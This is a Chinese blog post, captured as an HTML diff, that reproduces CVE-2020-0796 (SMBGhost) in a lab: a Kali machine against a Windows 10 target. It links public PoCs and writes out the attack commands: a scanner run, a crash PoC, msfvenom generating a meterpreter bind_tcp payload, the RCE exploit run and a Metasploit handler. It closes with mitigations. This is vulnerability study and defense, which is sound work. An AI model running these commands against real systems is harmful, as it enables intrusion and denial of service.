@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"content.json"};
+  </script>
+
+  <meta name="description" content="1. 漏洞背景1.1 漏洞描述CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2020-0796漏洞复现及防御机制">
+<meta property="og:url" content="http://example.com/posts/df5ab46f.html">
+<meta property="og:site_name" content="v5le0n9&#39;s garden">
+<meta property="og:description" content="1. 漏洞背景1.1 漏洞描述CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.1.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.3.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.2.2.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.1.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.2.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.3.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.5.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.4.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.7.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.6.png">
+<meta property="og:image" content="http://example.com/posts/undefined/2.3.8.png">
+<meta property="article:published_time" content="2022-05-27T14:04:19.047Z">
+<meta property="article:modified_time" content="2022-05-28T06:37:48.995Z">
+<meta property="article:author" content="v5le0n9">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/posts/undefined/2.2.1.png">
+
+<link rel="canonical" href="http://example.com/posts/df5ab46f.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CVE-2020-0796漏洞复现及防御机制 | v5le0n9's garden</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="v5le0n9's garden" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">v5le0n9's garden</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">小凉的秘密基地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/v5le0n9" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/df5ab46f.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="v5le0n9">
+      <meta itemprop="description" content="v5le0n9's garden">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v5le0n9's garden">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2020-0796漏洞复现及防御机制
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-27 22:04:19" itemprop="dateCreated datePublished" datetime="2022-05-27T22:04:19+08:00">2022-05-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-28 14:37:48" itemprop="dateModified" datetime="2022-05-28T14:37:48+08:00">2022-05-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞描述"><a href="#1-1-漏洞描述" class="headerlink" title="1.1 漏洞描述"></a>1.1 漏洞描述</h2><p>CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。</p>
+<span id="more"></span>
+<h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>在微软SMBv3远程代码执行漏洞中，SMB 3.1.1协议处理压缩消息时，对其中的数据没有经过安全检查，直接使用可能引发内存破坏漏洞，从而被攻击者利用远程执行任意代码。攻击者通过发送特殊构造的数据包触发漏洞，无需用户验证就可能控制目标系统，同时影响服务器与客户端系统。</p>
+<p>该漏洞存在于Windows的SMBv3.0(文件共享与打印服务)中，利用的端口是445。当SMBv3.0处理恶意制作的压缩数据包时，由于SMB没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压，并没有检查长度是否合法，最终导致整数溢出。远程未经认证的供给者就可能利用此漏洞在应用程序的上下文中执行任意代码，系统受到非授权控制。</p>
+<p>根据安全研究人员分析，该漏洞是一个整数溢出，发生在SMB服务驱动srv2.sys的<code>Srv2DecompressData()</code>函数中。</p>
+<p>详细请看：</p>
+<p><a target="_blank" rel="noopener" href="https://nosec.org/home/detail/4420.html">https://nosec.org/home/detail/4420.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44058342/article/details/105275847">https://blog.csdn.net/weixin_44058342/article/details/105275847</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/goabout2/p/12609810.html">https://www.cnblogs.com/goabout2/p/12609810.html</a></p>
+<h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>漏洞主要影响Windows 10版本（1903和1909），包括32位、64位的家用版、专业版、企业版、教育版。</p>
+<h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>微软SMBv3(Server Message Block 3.0)服务远程代码执行漏洞(CVE-2020-0796)可被攻击者利用，实现无须权限即可执行远程代码，受攻击的目标系统只需开机在线即可能被入侵。该漏洞后果十分接近永恒之蓝系列，存在被WannaCry等勒索蠕虫利用的可能，攻击者可以构造特定的网页、压缩包、共享目录、Office文档等多种方式触发漏洞进行攻击，对存在该漏洞的Windows主机造成严重威胁。</p>
+<h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796: 高危</span><br></pre></td></tr></table></figure>
+<h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p>
+<p>靶机：Windows 10 Version 1903 x64 教育版（IP地址：192.168.193.142 / 192.168.193.143）</p>
+<p>利用工具：</p>
+<ul>
+<li>MSF</li>
+<li>Windows平台漏洞检测工具：<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></li>
+<li>Linux平台漏洞检测工具：<a target="_blank" rel="noopener" href="https://github.com/joaozietolie/CVE-2020-0796-Checker">https://github.com/joaozietolie/CVE-2020-0796-Checker</a></li>
+<li>本地EXP提权：<a target="_blank" rel="noopener" href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a></li>
+<li>POC蓝屏攻击： <a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></li>
+<li>RCE poc：<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></li>
+</ul>
+<h2 id="2-2-复现准备"><a href="#2-2-复现准备" class="headerlink" title="2.2 复现准备"></a>2.2 复现准备</h2><p>检查靶机中的445端口是否已经打开。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.2.1.png" class="" title="检查445端口">
+<p>如果没有打开，在Windows 防火墙中添加入站规则，开启端口445。</p>
+<p>开启文件共享，否则Kali用nmap扫描时不会探测到靶机开启了445端口。</p>
+<img src="/posts/undefined/2.2.3.png" class="" title="开启文件共享">
+<img src="/posts/undefined/2.2.2.png" class="" title="开启文件共享">
+<h2 id="2-3-复现过程"><a href="#2-3-复现过程" class="headerlink" title="2.3 复现过程"></a>2.3 复现过程</h2><h3 id="2-3-1-本地提权"><a href="#2-3-1-本地提权" class="headerlink" title="2.3.1 本地提权"></a>2.3.1 本地提权</h3><p>使用奇安信检测CVE-2020-0796漏洞工具，它适用于局域网批量检测，快速查找未打补丁的主机。</p>
+<img src="/posts/undefined/2.3.1.png" class="" title="检测漏洞">
+<p>使用本地EXP提权，下载下来是VS的一个工程文件，需要利用VS编译生成EXE文件。</p>
+<p>查看当前用户，是普通用户，运行<code>cve-2020-0796-local.exe</code>后弹出另一个cmd窗口，在那个cmd窗口下的用户已经变成管理员了。</p>
+<img src="/posts/undefined/2.3.2.png" class="" title="本地提权">
+<h3 id="2-3-2-蓝屏攻击"><a href="#2-3-2-蓝屏攻击" class="headerlink" title="2.3.2 蓝屏攻击"></a>2.3.2 蓝屏攻击</h3><p>使用Linux平台CVE-2020-0796漏洞检测工具检查靶机是否存在该漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash CVE-2020-0796-Checker.sh -t 192.168.193.143</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.3.3.png" class="" title="检测漏洞">
+<p>确认存在该漏洞后，使用POC蓝屏攻击脚本进行攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 192.168.193.143</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.3.5.png" class="">
+<p>靶机成功蓝屏：</p>
+<img src="/posts/undefined/2.3.4.png" class="" title="靶机蓝屏">
+<h3 id="2-3-3-远程登录"><a href="#2-3-3-远程登录" class="headerlink" title="2.3.3 远程登录"></a>2.3.3 远程登录</h3><p>RCE(remote command/code excute)，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+<p>利用MSF生成Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=1234 -f py -o smb.py</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.3.7.png" class="" title="生成payload">
+<p>将Payload里的<code>buf</code>变量更名为<code>USER_PAYLOAD</code>，再将RCE poc中的<code>exploit.py</code>中的<code>USER_PAYLOAD</code>的值更换成Payload中的值。</p>
+<p>给<code>exploit.py</code>增加执行权限，执行文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exploit.py</span><br><span class="line">python3 exploit.py -ip 192.168.193.143</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/2.3.6.png" class="" title="运行exploit">
+<p>利用MSF开启监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.193.143</span><br><span class="line">set lport 1234</span><br><span class="line">show options	#查看还有没有参数没有设置的</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>结果运行到这里一直卡住：</p>
+<img src="/posts/undefined/2.3.8.png" class="" title="运行卡住">
+<p><strong>不知道什么问题，运行了很多次仍然卡在这。</strong></p>
+<p>实现远程登录后再通过本地提权，可以拿到靶机的管理员权限。</p>
+<h1 id="3-防御方法"><a href="#3-防御方法" class="headerlink" title="3. 防御方法"></a>3. 防御方法</h1><ul>
+<li><p>安装补丁。</p>
+</li>
+<li><p>根据BleepComputer的说法，尽管微软并未共享禁用SMBv3压缩的官方方法，但是Foregenix Solutions架构师Niall Newman在分析了Srv2.sys文件后可以通过手动修改注册表，防止被黑客远程攻击。</p>
+<ul>
+<li><p>在注册表“HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters”建立一个名为<code>DisableCompression</code>的DWORD，值为1，禁止SMB的压缩功能。</p>
+</li>
+<li><p>或在管理员模式启动PowerShell，输入以下命令，执行即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 -Force</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>若无业务需要，在网络安全域边界防火墙封堵文件打印和共享端口TCP 135/139/445以缓解此问题。</p>
+</li>
+<li><p>可以通过安全厂商的漏洞检验和修复工具来检查是否存在漏洞和进行漏洞修复。</p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="v5le0n9 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="v5le0n9 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/fa648f2b.html" rel="prev" title="MS08-067漏洞复现及防御机制">
+      <i class="fa fa-chevron-left"></i> MS08-067漏洞复现及防御机制
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-text">1. 漏洞背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-text">1.1 漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">1.2 漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-text">1.3 影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E5%BD%B1%E5%93%8D%E6%96%B9%E5%BC%8F"><span class="nav-text">1.4 影响方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-%E6%BC%8F%E6%B4%9E%E8%AF%84%E7%BA%A7"><span class="nav-text">1.5 漏洞评级</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">2. 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">2.1 环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E5%A4%8D%E7%8E%B0%E5%87%86%E5%A4%87"><span class="nav-text">2.2 复现准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-text">2.3 复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-1-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="nav-text">2.3.1 本地提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-2-%E8%93%9D%E5%B1%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2.3.2 蓝屏攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-3-%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="nav-text">2.3.3 远程登录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-text">3. 防御方法</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="v5le0n9"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">v5le0n9</p>
+  <div class="site-description" itemprop="description">v5le0n9's garden</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/Leong_Vinson" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leong_Vinson" rel="noopener" target="_blank"><i class="fab fa-cuttlefish fa-fw"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/v5le0n9" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;v5le0n9" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:v5le0n9@163.com" title="E-Mail → mailto:v5le0n9@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v5le0n9</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">923k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">13:59</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
